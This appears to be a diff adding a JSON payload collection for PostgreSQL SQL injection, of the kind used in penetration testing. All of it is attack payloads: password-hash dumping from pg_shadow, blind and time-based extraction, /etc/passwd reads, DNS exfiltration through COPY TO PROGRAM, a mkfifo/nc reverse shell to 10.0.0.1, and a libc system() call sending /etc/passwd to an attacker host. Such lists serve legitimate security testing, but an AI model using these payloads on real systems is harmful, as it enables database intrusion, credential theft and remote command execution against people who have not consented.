@@ -1,0 +1,114 @@
+{
+  "category": "PostgreSQL Injection",
+  "keyword": "postgres",
+  "payloads": [
+    {
+      "type": "Comments",
+      "tech": ["syntax"],
+      "payload": "--",
+      "description": "Single-line comment"
+    },
+    {
+      "type": "Enumeration",
+      "tech": ["information_gathering"],
+      "payload": "SELECT version()",
+      "description": "Get DBMS version"
+    },
+    {
+      "type": "Enumeration",
+      "tech": ["privilege_escalation"],
+      "payload": "SELECT usename, passwd FROM pg_shadow",
+      "description": "List password hashes"
+    },
+    {
+      "type": "Methodology",
+      "tech": ["schema_enumeration"],
+      "payload": "SELECT DISTINCT(schemaname) FROM pg_tables",
+      "description": "List schemas"
+    },
+    {
+      "type": "Methodology",
+      "tech": ["data_exfiltration"],
+      "payload": "SELECT column_name FROM information_schema.columns WHERE table_name='data_table'",
+      "description": "List columns in a table"
+    },
+    {
+      "type": "Error Based",
+      "tech": ["error_based"],
+      "payload": "AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC) -- -",
+      "description": "CAST method for error-based injection"
+    },
+    {
+      "type": "XML Helpers",
+      "tech": ["data_dumping"],
+      "payload": "SELECT query_to_xml('select * from pg_user',true,true,'')",
+      "description": "Dump query results as XML"
+    },
+    {
+      "type": "Blind Injection",
+      "tech": ["blind"],
+      "payload": "' and substr(version(),1,10) = 'PostgreSQL' and '1",
+      "description": "Substring equivalent for blind injection"
+    },
+    {
+      "type": "Time Based",
+      "tech": ["time_based"],
+      "payload": "select 1 from pg_sleep(5)",
+      "description": "Basic time delay"
+    },
+    {
+      "type": "Time Based",
+      "tech": ["time_based", "data_exfiltration"],
+      "payload": "select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1",
+      "description": "Database name exfiltration via time delay"
+    },
+    {
+      "type": "Out of Band",
+      "tech": ["oob_exfiltration"],
+      "payload": "declare c text; declare p text; begin SELECT into p (SELECT YOUR-QUERY-HERE); c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN'''; execute c; END; $$ language plpgsql security definer;",
+      "description": "DNS exfiltration using COPY TO PROGRAM"
+    },
+    {
+      "type": "Stacked Query",
+      "tech": ["command_execution"],
+      "payload": "SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--",
+      "description": "Execute multiple queries in a single statement"
+    },
+    {
+      "type": "File Read",
+      "tech": ["file_read"],
+      "payload": "CREATE TABLE temp(t TEXT); COPY temp FROM '/etc/passwd'; SELECT * FROM temp limit 1 offset 0;",
+      "description": "Read file using COPY command"
+    },
+    {
+      "type": "File Write",
+      "tech": ["file_write"],
+      "payload": "COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab'",
+      "description": "Write file using COPY command (one-line)"
+    },
+    {
+      "type": "Command Execution",
+      "tech": ["command_execution"],
+      "payload": "COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f'",
+      "description": "Reverse shell using COPY FROM PROGRAM"
+    },
+    {
+      "type": "Command Execution",
+      "tech": ["command_execution"],
+      "payload": "CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');",
+      "description": "Command execution via libc.so.6"
+    },
+    {
+      "type": "WAF Bypass",
+      "tech": ["waf_bypass"],
+      "payload": "SELECT CHR(65)||CHR(66)||CHR(67);",
+      "description": "Alternative to quotes using CHR()"
+    },
+    {
+      "type": "Privileges",
+      "tech": ["privilege_escalation"],
+      "payload": "SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;",
+      "description": "Check superuser status"
+    }
+  ]
+}
